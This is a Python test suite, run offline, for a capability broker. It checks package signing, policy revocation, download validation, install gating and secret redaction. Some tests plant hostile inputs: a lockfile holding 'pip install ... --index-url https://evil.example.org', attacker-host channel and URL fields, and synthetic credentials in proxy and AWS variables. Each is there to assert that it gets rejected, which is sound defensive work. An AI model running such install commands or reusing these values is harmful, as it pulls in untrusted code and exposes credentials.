"""Offline only: no sockets, subprocesses, provider credentials or downloads."""

import hashlib
import json
import sqlite3
from dataclasses import replace
from datetime import UTC, datetime, timedelta
from types import SimpleNamespace

import pytest
from test_capabilities import declaration
from test_input_delivery import _delivery

from tessera_control.capability_broker_store import CapabilityBrokerStore, InProcessBrokerAuthority
from tessera_control.capability_models import CapabilityDeclaration
from tessera_control.capability_package import SignedCapabilityPackage
from tessera_control.store import canonical_digest
from tessera_worker.capability_broker import CapabilityBroker, EffectDenied
from tessera_worker.capability_effects import (
    DownloadResponse,
    FakeCapabilityEffects,
    GatedRealCapabilityEffects,
    InstallResult,
    RealBackendConfig,
)
from tessera_worker.capability_journal import CapabilityJournal, JournalConflict, validate_bundle


@pytest.fixture
def make_broker(tmp_path):
    journals = []
    count = 0

    def make(kind="data", content=b"synthetic fixture bytes", change=None):
        nonlocal count
        root = tmp_path / str(count)
        root.mkdir()
        count += 1
        state, _, owner, worker, grant, lease = _delivery(root)
        store = CapabilityBrokerStore(state, signing_key=b"offline-test-key-not-a-secret-0000")
        declared = declaration(kind)
        declared["broker_basis"] = dict(
            protocol_digest="1" * 64,
            data_digest=grant["snapshot_digest"],
            code_digest="2" * 64,
            environment_digest="3" * 64,
        )
        action = declared["actions"][0]
        action.update(
            sha256=hashlib.sha256(content).hexdigest(),
            expected_size=len(content),
            content_type="application/octet-stream",
            max_bytes=max(1, len(content)),
        )
        declared["max_bytes"] = max(1, len(content))
        lock = b""
        if kind == "package":
            action["url"] += ".whl"
            action["filesystem_root"] = "/workspace/packages/isolated"
            declared["filesystem_roots"] = [action["filesystem_root"]]
            lock = json.dumps(
                [
                    dict(
                        name=action["name"],
                        version=action["version"],
                        artifact_sha256=action["sha256"],
                    )
                ],
                sort_keys=True,
            ).encode()
            action["lockfile_sha256"] = hashlib.sha256(lock).hexdigest()
        if change:
            change(declared)
        declared = CapabilityDeclaration.model_validate(declared).model_dump(mode="json")
        _, policy = store.request(
            owner,
            grant["task_id"],
            "request",
            {
                "expected_plan_revision": grant["task_revision"] - 1,
                "expected_plan_digest": grant["plan_digest"],
                "declaration": declared,
            },
        )
        _, policy = store.approve(
            owner,
            policy["id"],
            "approve",
            {
                "expected_revision": 1,
                "declaration_digest": policy["declaration_digest"],
                "expires_at": (datetime.now(UTC) + timedelta(minutes=5)).isoformat(),
            },
        )
        _, operation = store.admit(
            worker,
            policy["id"],
            "admit",
            {
                "execution_lease_id": lease["id"],
                "expected_epoch": lease["epoch"],
                "environment_id": declared["environment_id"],
                "image_digest": declared["image_digest"],
                "action": declared["actions"][0],
                "credential_access_lease_id": None,
            },
        )
        package = store.issue(worker, operation["id"])
        journal = CapabilityJournal(root / "journal")
        journals.append(journal)
        effects = FakeCapabilityEffects(content)
        identity = (worker["org_id"], grant["project_id"], worker["id"])
        authority = InProcessBrokerAuthority(store, worker)
        broker = CapabilityBroker(journal, authority=authority, identity=identity, effects=effects)
        return SimpleNamespace(**locals())

    yield make
    for journal in journals:
        journal.close()


def run(h):
    return h.broker.run(h.package, lock=h.lock)


@pytest.mark.parametrize("kind", ["data", "model", "package"])
def test_complete_pinned_effect_and_control_custody(make_broker, kind):
    h = make_broker(kind)
    assert h.store.issue(h.worker, h.operation["id"]) == h.package
    bundle = run(h)
    assert bundle["state"] == "completed"
    validate_bundle(bundle, h.package.digest)
    assert [r["state"] for r in bundle["receipts"]][:3] == ["requested", "approved", "started"]
    last = bundle["receipts"][-1]
    assert last["evidence"] == "synthetic" and last["cost"] is last["usage"] is None
    assert last["termination_confirmed"] is True
    assert last["max_bytes"] == len(h.content) and last["max_concurrency"] == 1
    if kind == "package":
        assert last["installed_packages"][0]["version"] == "1.0"
        assert (
            last["installed_packages"][0]["artifact_sha256"]
            == hashlib.sha256(h.content).hexdigest()
        )

    def sink(package, bundle, content):
        return h.store.reconcile(h.worker, package, bundle, content)

    result = h.journal.reconcile(h.package, sink)
    assert result["custody"] == "quarantined_unreleased"
    assert h.journal.reconcile(h.package, sink) == result
    with sqlite3.connect(h.store.database_path) as db:
        assert (
            db.execute(
                "SELECT count(*) FROM events WHERE "
                "event_type='capability.broker_journal_reconciled'"
            ).fetchone()[0]
            == 1
        )
    previous = list(h.effects.calls)
    with pytest.raises((JournalConflict, EffectDenied)):
        run(h)
    assert h.effects.calls == previous
    with h.journal.connect() as db:
        assert (
            db.execute("SELECT classification FROM custody").fetchone()[0]
            == "quarantined_unreleased"
        )
        with pytest.raises(sqlite3.IntegrityError, match="append only"):
            db.execute("UPDATE receipts SET payload='{}'")


@pytest.mark.parametrize("field", ["signature", "digest", "payload"])
def test_tampered_package_never_reaches_effect(make_broker, field):
    h = make_broker()
    bad = replace(h.package, **{field: b"{}" if field == "payload" else "0" * 64})
    with pytest.raises((ValueError, EffectDenied)):
        h.broker.run(bad)
    assert not h.effects.calls


@pytest.mark.parametrize("index", [0, 1, 2])
def test_configured_identity_not_agent_claim(make_broker, index):
    h = make_broker()
    identity = list(h.identity)
    identity[index] = "other"
    h.broker.identity = tuple(identity)
    with pytest.raises(EffectDenied):
        run(h)
    assert not h.effects.calls


@pytest.mark.parametrize(
    "sql",
    [
        "UPDATE capability_policies SET status='revoked'",
        "UPDATE capability_policies SET expires_at='2000-01-01T00:00:00Z'",
        "UPDATE execution_leases SET expires_at='2000-01-01T00:00:00Z'",
        "UPDATE execution_grants SET epoch=epoch+1",
        "UPDATE execution_grants SET status='cancel_requested'",
        "UPDATE worker_registry SET lifecycle_state='retired'",
    ],
)
def test_recheck_between_chunks_prevents_next_effect(make_broker, sql):
    h = make_broker(content=b"a" * 100000)
    reads = 0

    def revoke(phase):
        nonlocal reads
        if phase == "read":
            reads += 1
            with sqlite3.connect(h.store.database_path) as db:
                db.execute(sql)

    h.effects.before = revoke
    bundle = run(h)
    assert bundle["state"] == "failed" and reads == 1
    assert bundle["size"] == 65536
    assert bundle["receipts"][-1]["reason"] == "policy"
    assert not any(r["phase"] == "publication" for r in bundle["receipts"])


@pytest.mark.parametrize(
    "changes",
    [
        {"url": "https://other.example.org/file"},
        {"url": "https://artifacts.example.org:444/approved/fixture"},
        {"url": "https://artifacts.example.org/approved/../file"},
        {"addresses": ("8.8.8.8", "127.0.0.1")},
        {"status": 302},
        {"content_type": "text/html"},
        {"size": 999},
    ],
)
def test_destination_dns_status_type_size_denied(make_broker, changes):
    h = make_broker()
    h.effects.response = replace(
        DownloadResponse(
            h.action["url"], ("8.8.8.8",), 200, "application/octet-stream", len(h.content)
        ),
        **changes,
    )
    bundle = run(h)
    assert bundle["state"] == "failed"
    assert bundle["receipts"][-1]["reason"] == "mismatch"
    assert "read" not in h.effects.calls


@pytest.mark.parametrize("content", [b"X" * 23, b"partial", b"x" * 100])
def test_bad_hash_partial_and_oversize_quarantined(make_broker, content):
    h = make_broker()
    h.effects.content = content
    h.effects.response = DownloadResponse(
        h.action["url"], ("8.8.8.8",), 200, "application/octet-stream", len(h.content)
    )
    result = run(h)
    assert result["state"] == "failed"
    assert result["size"] <= len(h.content)
    with h.journal.connect() as db:
        assert db.execute("SELECT count(*) FROM custody").fetchone()[0] == 0


def test_real_backend_blocks_even_with_all_self_asserted_configuration(make_broker):
    h = make_broker()
    h.broker.effects = GatedRealCapabilityEffects(
        RealBackendConfig(
            enabled=True,
            target="kubernetes",
            sandbox_runner_id="configured",
            network_client_id="configured",
            isolation_inspector_id="configured",
        ),
        sandbox_runner=object(),
        network_client=object(),
        isolation_inspector=object(),
    )
    result = run(h)
    assert result["state"] == "blocked"
    assert result["receipts"][-1]["reason"] == "backend_unavailable"


@pytest.mark.parametrize("confirm", [True, False])
def test_cancellation_distinct_from_confirmed_stop(make_broker, confirm):
    h = make_broker()
    h.effects.confirm_stop = confirm
    h.effects.before = lambda phase: (
        h.journal.cancel(h.operation["id"]) if phase == "read" else None
    )
    result = run(h)
    assert result["state"] == ("cancelled" if confirm else "unknown")
    assert result["receipts"][-2]["state"] == "cancel_requested"
    assert result["receipts"][-1]["termination_confirmed"] is confirm


def test_monotonic_timeout_prevents_install_and_publication(make_broker):
    h = make_broker("package")
    clock = [0.0]
    h.broker.monotonic = lambda: clock[0]

    def advance(phase):
        if phase == "read":
            clock[0] = 11

    h.effects.before = advance
    result = run(h)
    assert result["state"] == "failed" and result["receipts"][-1]["reason"] == "timeout"
    assert "install" not in h.effects.calls


@pytest.mark.parametrize(
    "changes",
    [
        {"inventory": ()},
        {"exit_code": 1},
        {"verified": False},
        {"target_digest": "f" * 64},
        {"termination_confirmed": False},
    ],
)
def test_partial_install_never_success(make_broker, changes):
    h = make_broker("package")
    target = canonical_digest([h.package.digest, h.action["filesystem_root"]])
    h.effects.install_result = replace(
        InstallResult(
            ((h.action["name"], h.action["version"], h.action["sha256"]),), 0, True, True, target
        ),
        **changes,
    )
    result = run(h)
    assert result["state"] in {"failed", "unknown"}
    assert not result["receipts"][-1]["installed_packages"]


def test_lost_install_reply_unknown_no_secret_leakage_or_retry(make_broker):
    h = make_broker("package")
    secret = "secret-provider-token-do-not-retain"

    def lose(phase):
        if phase == "install":
            raise RuntimeError(secret)

    h.effects.before = lose
    result = run(h)
    assert result["state"] == "unknown"
    assert secret not in json.dumps(result)
    with pytest.raises(JournalConflict):
        run(h)


def test_wrong_lock_never_downloads_or_installs(make_broker):
    h = make_broker("package")
    h.lock = b"pip install arbitrary --index-url https://evil.example.org"
    result = run(h)
    assert result["state"] != "completed"
    assert not h.effects.calls


def test_unapproved_package_fields_and_root_cannot_be_resigned_by_worker(make_broker):
    h = make_broker("package")
    for changes in (
        {"manager": "conda"},
        {"channel": "https://evil.example.org"},
        {"filesystem_root": "/control-pvc"},
        {"url": "https://evil.example.org/a"},
    ):
        payload = json.loads(h.package.payload)
        payload["binding"]["action"].update(changes)
        raw = json.dumps(payload, sort_keys=True, separators=(",", ":")).encode()
        bad = SignedCapabilityPackage(raw, hashlib.sha256(raw).hexdigest(), h.package.signature)
        with pytest.raises(ValueError):
            h.broker.run(bad)
    assert not h.effects.calls


@pytest.mark.parametrize("manager", ["conda", "uv"])
def test_supported_install_manager_is_narrower_than_policy(make_broker, manager):
    def change(d):
        d["actions"][0]["manager"] = manager
        d["package_channels"][0]["manager"] = manager

    h = make_broker("package", change=change)
    result = run(h)
    assert (result["state"] == "completed") is (manager == "uv")
    if manager == "conda":
        assert not h.effects.calls


def test_legacy_declaration_without_broker_basis_fails_closed(make_broker):
    from tessera_control.store import Conflict

    with pytest.raises(Conflict, match="Explicit approved broker basis"):
        make_broker(change=lambda d: d.pop("broker_basis"))


def test_mismatched_execution_data_basis_denied(make_broker):
    from tessera_control.store import Conflict

    with pytest.raises(Conflict, match="execution data"):
        make_broker(change=lambda d: d["broker_basis"].update(data_digest="9" * 64))


def test_secret_in_untrusted_response_not_in_receipts(make_broker):
    h = make_broker()
    secret = "never-copy-this-token"
    h.effects.response = DownloadResponse(
        h.action["url"] + "?token=" + secret,
        ("8.8.8.8",),
        200,
        "application/octet-stream",
        len(h.content),
    )
    result = run(h)
    assert result["state"] == "failed"
    assert secret not in json.dumps(result)


def test_offline_broker_never_uses_network_shell_or_ambient_credentials(make_broker, monkeypatch):
    import socket
    import subprocess

    h = make_broker("package")

    def deny(*args, **kwargs):
        raise AssertionError("real effect attempted")

    monkeypatch.setattr(socket, "socket", deny)
    monkeypatch.setattr(subprocess, "Popen", deny)
    monkeypatch.setenv("HTTPS_PROXY", "https://secret:token@proxy.example.org")
    monkeypatch.setenv("AWS_SECRET_ACCESS_KEY", "synthetic-do-not-read")
    result = run(h)
    assert result["state"] == "completed"
    assert "synthetic-do-not-read" not in json.dumps(result)


def test_expiry_during_authority_reply_fences_next_call(make_broker):
    h = make_broker()
    current = [datetime.now(UTC)]
    h.broker.now = lambda: current[0]
    original = h.authority.__class__.__call__

    class DelayedAuthority:
        count = 0

        def __call__(self, package):
            result = original(h.authority, package)
            self.count += 1
            if self.count == 2:
                current[0] += timedelta(seconds=60)
            return result

        def claim(self, package, journal_id):
            return h.authority.claim(package, journal_id)

    h.broker.authority = DelayedAuthority()
    result = run(h)
    assert result["state"] == "failed"
    assert result["receipts"][-1]["reason"] == "timeout"
    assert not h.effects.calls
